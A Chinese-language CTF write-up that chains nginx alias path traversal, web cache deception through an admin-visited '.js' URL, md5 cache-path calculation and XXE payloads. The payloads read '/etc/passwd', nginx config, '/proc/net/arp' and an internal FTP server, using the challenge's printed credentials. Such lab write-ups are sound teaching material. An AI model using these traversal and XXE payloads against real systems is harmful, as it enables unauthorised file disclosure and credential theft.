# nginx的秘密wp

此题目出的挺好的，故收藏在这里，主要创新点在于利用：

> nginx的静态缓存 + nginx的配置问题造成的任意读取来做页面的信息泄露

感觉这个题目如果可以再跟xss相结合，就更加的完美了。

## 第一步，web缓存漏洞

完成一步需四个点结合。

#### 第一点：

观察到`static`有存在目录穿越漏洞，虽然没开`autoindex`但依然可以通过`/static../etc/passwd`下载文件。结合提示从nginx的配置开始，可以想到下载`nginx.conf`，下载的路径是默认的nginx安装路径`/static../etc/nginx/nginx.conf`。可以看到nginx配置，diff一下可以看到关键点在

```
proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;
	
	limit_conn_zone $binary_remote_addr zone=conn:10m;
	limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;

	
	server {
	    listen 4455 default_server;
	    server_name localhost;

	    location /static {
	        alias /home/;
	    }

	    location ~* \.(css|js|gif|png){
	        proxy_cache             my_cache;
	        proxy_cache_valid       200 30s;
	        proxy_pass              http://bugweb.app:8000;
	        proxy_set_header        Host $host:$server_port;
	        proxy_ignore_headers    Expires Cache-Control Set-Cookie;
	    }

	    location / {
	        limit_conn conn 20;
	        proxy_pass       http://bugweb.app:8000;
	        proxy_set_header Host $host:$server_port;
	    }
	}
```

#### 第二点

通过一些方法发现路由映射和些小问题。例如在扫描目录的时候可以发现目录匹配的范围有点宽泛。

登陆后访问发现，这些路由都是访问的`edit`页面，随便测`editxxx`发现也映射到相同的页面。猜测后台路由的逻辑是只要访问的是以`edit`开头都相当于访问`edit`。

#### 第三点：

继续看一下nginx的配置:

```
proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;
location ~* \.(css|js|gif|png){
	        proxy_cache             my_cache;
	        proxy_cache_valid       200 30s;
	        proxy_pass              http://bugweb.app:8000;
	        proxy_set_header        Host $host:$server_port;
	        proxy_ignore_headers    Expires Cache-Control Set-Cookie;
	}
```
发现路径只要匹配到 .js/.css/.png/.gif就会进行换缓存,并且根据nginx的配置说明[https://www.nginx.com/blog/nginx-caching-guide/](https://www.nginx.com/blog/nginx-caching-guide/)，缓存路径下面这样求的：

先计算：
```
md5($scheme$proxy_host$request_uri)
```
然后取最后一位当做第一个路路径，倒数第二三位当第二个路路径，然后把整个md5作为文件名。

比如访问：
```
http://ip:4455/write_plan/test.js/
```
计算步骤如下：

```
✗ echo -n 'http://bugweb.app:8000/write_plan/test.js/' | md5
ca223d413bd52623bffcde273271176e
```
最后缓存的路径是：

```
/tmp/mycache/e/76/ca223d413bd52623bffcde273271176e
```	
通过上面说对的任意文件读取，就可以读取这个缓存文件

```
http://ip:4455/static../tmp/mycache/e/76/ca223d413bd52623bffcde273271176e
```

#### 第四点：

有一个`post_bug`，这个点的功能是给提交bug给管理员，管理员会点击查看。有一个`write_plan`可以写一些东西，其他人看不见。如果你访问过`/user/admin`还会发现一个小tip管理员说自己已经把所有密码写在秘密计划里面了。

这些个点结合起来可以触发web缓存漏洞。通过`post_bug`的功能，给管理员发送url`http://xxxxx/write_plan/test.js`,然后管理员就会访问这个链接，导致管理员的`write_plan`页面被缓存下来

![postbug](postbug.png)

然后利用之前的任意文件读取获取缓存，就看到的东西如下

![plan](plan.PNG)

拿到内网ftp服务器的账号密码。`syc10ver Eec5TN9fruOOTp2G`。


## 第二步，xxe的两个协议

如果有师傅把第一步做出来了，相信下面的操作也很简单了。虽然题目提示给的是从nginx开始，但是我总是感觉很多师傅第一个找到的漏洞点是xxe。触发点在上传计划那里，xml文件中的外部实体可以被解析。

之所以要多出一步，是我觉得有两个tip还是有些师傅没（强）有（行）关（增）注（加）到（难度）。

1. url的完整的形式是`scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]`
2. `proc`伪文件中有arp信息


我这里用的解析xml的python库加载外部实体的时候用的是urlopen，如果没记错的话只支持`ftp`，`http`，`file`。上传

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE person [<!ENTITY remote SYSTEM
"file:///proc/net/arp">]>
<plans>
	<plan>
		<content>payload &remote;</content>
	</plan>
</plans>
```

![proc](proc.PNG)

读目录，把两个ip都试试

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE person [<!ENTITY remote SYSTEM
"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/">]>
<plans>
	<plan>
		<content>payload &remote;</content>
	</plan>
</plans>
```

 ![dir](dir.PNG)

读flag

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE person [<!ENTITY remote SYSTEM
"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/flag327a6c4304ad5938eaf0efb6cc3e53dc">]>
<plans>
	<plan>
		<content>payload &remote;</content>
	</plan>
</plans>
```

最后get flag

 ![flag](flag.PNG)